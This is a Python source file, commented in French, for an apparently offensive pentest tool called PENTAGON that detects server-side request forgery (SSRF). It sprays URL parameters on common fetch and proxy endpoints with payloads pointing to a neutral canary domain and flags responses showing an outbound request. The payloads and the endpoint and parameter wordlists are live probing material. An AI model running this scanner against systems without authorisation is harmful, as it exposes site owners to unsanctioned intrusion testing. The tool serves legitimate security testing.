"""
Outil de test de falsification de requête côté serveur (SSRF) pour PENTAGON.

Prouve, PAR ATTAQUE RÉELLE mais NON DESTRUCTIVE, qu'un endpoint accepte une URL
fournie par l'utilisateur et va la CHERCHER côté serveur, sans liste blanche.
Un attaquant peut alors faire émettre au serveur des requêtes vers des services
internes (métadonnées cloud, back-offices, bases) inaccessibles de l'extérieur.

Méthode (boîte noire, offensive, bornée à la preuve) :
  1. On cible des endpoints candidats (découverts + chemins de « fetch/proxy »
     courants) et des noms de paramètre d'URL usuels.
  2. On injecte une URL vers un DOMAINE CANARI NEUTRE et inexistant.
  3. Si la réponse montre que le serveur a TENTÉ la requête sortante vers ce
     domaine (erreur de résolution/connexion mentionnant le canari, ou corps
     récupéré pour ce canari), la falsification de requête est PROUVÉE.

GARDE-FOU « prouver, jamais ravager » : la cible est un domaine canari neutre et
inexistant — on ne vise JAMAIS un service interne réel ni les métadonnées cloud.
On prouve seulement que le serveur émet une requête vers une destination que
nous contrôlons.

Conçu pour être GÉNÉRIQUE : aucune donnée spécifique à une cible.

Catégorie d'action RoE : exploitation (outil offensif).
Standards :
- OWASP A10:2021 (Server-Side Request Forgery)
- OWASP WSTG-INPV-19 (Testing for Server-Side Request Forgery)
- CWE-918 (Server-Side Request Forgery)
- MITRE ATT&CK T1190 (Exploit Public-Facing Application)
"""

from datetime import datetime, timezone
from typing import Any
from urllib.parse import urlparse


DEFAULT_TIMEOUT = 20

# Domaine canari externe, neutre et inexistant (preuve sans nuisance).
CANARY_HOST = "pentagon-ssrf-test.example"

# Charges SSRF : URL vers le canari (preuve de requête sortante contrôlée).
PAYLOADS = [
    f"http://{CANARY_HOST}/pgnssrf",
    f"https://{CANARY_HOST}/pgnssrf",
]

# Signatures d'une requête sortante RÉELLEMENT TENTÉE par le serveur :
# erreurs réseau (DNS/connexion) ou indices d'un corps récupéré côté serveur.
FETCH_SIGNATURES = (
    "enotfound", "eai_again", "getaddrinfo", "econnrefused", "etimedout",
    "could not resolve", "name resolution", "connection refused",
    "name or service not known", "timed out", "timeout", "fetchedurl",
    "\"status\"",
)

# Noms de paramètres d'URL usuels (les plus courants en tête).
URL_PARAMS = ["url", "uri", "link", "target", "dest", "fetch", "endpoint",
              "callback", "webhook", "image", "img", "src", "feed", "u",
              "path", "host", "domain", "next", "load"]

# Endpoints de « fetch/proxy » courants (sondés même sans découverte).
COMMON_FETCH_PATHS = ["/api/fetch", "/fetch", "/api/preview", "/api/proxy",
                      "/proxy", "/api/import", "/api/url", "/api/webhook",
                      "/api/image"]

# Indices qu'un endpoint découvert fait probablement une requête sortante.
FETCH_HINTS = ("fetch", "proxy", "preview", "import", "url", "link", "webhook",
               "callback", "image", "avatar", "feed", "remote", "load", "go")


def _is_ssrf_signal(text: str, canary_host: str) -> bool:
    """
    Vrai si la réponse atteste que le serveur a tenté une requête sortante vers
    le canari : le domaine canari apparaît ET une signature de requête réseau
    (erreur de résolution/connexion ou corps récupéré) est présente.
    """
    if not text:
        return False
    low = text.lower()
    if canary_host.lower() not in low:
        return False
    return any(sig in low for sig in FETCH_SIGNATURES)


def _base_origin(url: str) -> str:
    """Origine (scheme://host[:port]) d'une URL ou d'un domaine."""
    p = urlparse(url if url.startswith("http") else f"https://{url}")
    return f"{p.scheme}://{p.netloc}"


def _candidate_endpoints(target_base: str,
                         candidate_urls: list[str] | None) -> list[str]:
    """Chemins de fetch/proxy courants + endpoints découverts pertinents."""
    origin = _base_origin(target_base)
    endpoints: list[str] = [origin + p for p in COMMON_FETCH_PATHS]
    seen = set(endpoints)
    for url in candidate_urls or []:
        u = url if url.startswith("http") else origin + (url if url.startswith("/") else "/" + url)
        u = u.split("?", 1)[0]
        if any(h in u.lower() for h in FETCH_HINTS) and u not in seen:
            endpoints.append(u)
            seen.add(u)
    return endpoints


def run_ssrf_test(target_base: str,
                  candidate_urls: list[str] | None = None,
                  token: str | None = None,
                  timeout: int = DEFAULT_TIMEOUT,
                  delay_between_requests: float = 0.3) -> dict[str, Any]:
    """
    Teste la falsification de requête côté serveur (SSRF) sur des candidats.

    Returns:
        {
          "status": "success" | "error",
          "tested_endpoints": [...],
          "findings": [{title, severity, affected_endpoint, param, payload,
                        evidence, owasp, cwe, confidence}],
          "vulnerable": bool,
          "error": "..."
        }
    """
    import time
    import requests  # import différé (tool offensif exécuté sur la plateforme)

    result: dict[str, Any] = {
        "status": "success",
        "tested_endpoints": [],
        "findings": [],
        "vulnerable": False,
        "error": None,
    }

    endpoints = _candidate_endpoints(target_base, candidate_urls)
    result["tested_endpoints"] = endpoints
    headers = {"User-Agent": "PENTAGON-Exploitation-Agent/1.0"}
    if token:
        headers["Authorization"] = f"Bearer {token}"

    findings: list[dict[str, Any]] = []
    started = datetime.now(timezone.utc)

    for endpoint in endpoints:
        proven = False
        for param in URL_PARAMS:
            if proven:
                break
            for payload in PAYLOADS:
                try:
                    resp = requests.get(endpoint, params={param: payload},
                                        headers=headers, timeout=timeout,
                                        allow_redirects=False)
                except requests.exceptions.RequestException:
                    continue
                finally:
                    time.sleep(delay_between_requests)

                if _is_ssrf_signal(resp.text or "", CANARY_HOST):
                    snippet = (resp.text or "").strip().replace("\n", " ")[:160]
                    findings.append({
                        "title": "Falsification de requête côté serveur (SSRF)",
                        "severity": "high",
                        "affected_endpoint": f"{endpoint}?{param}=",
                        "param": param,
                        "payload": payload,
                        "evidence": f"Requête sortante émise par le serveur vers le canari : « {snippet} »",
                        "owasp": "A10:2021",
                        "cwe": "CWE-918",
                        "confidence": 0.9,
                    })
                    proven = True
                    result["vulnerable"] = True
                    break

    result["findings"] = findings
    result["duration_seconds"] = (datetime.now(timezone.utc) - started).total_seconds()
    return result


if __name__ == "__main__":
    import json
    import sys
    base = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
    print(json.dumps(run_ssrf_test(base), indent=2, ensure_ascii=False, default=str))
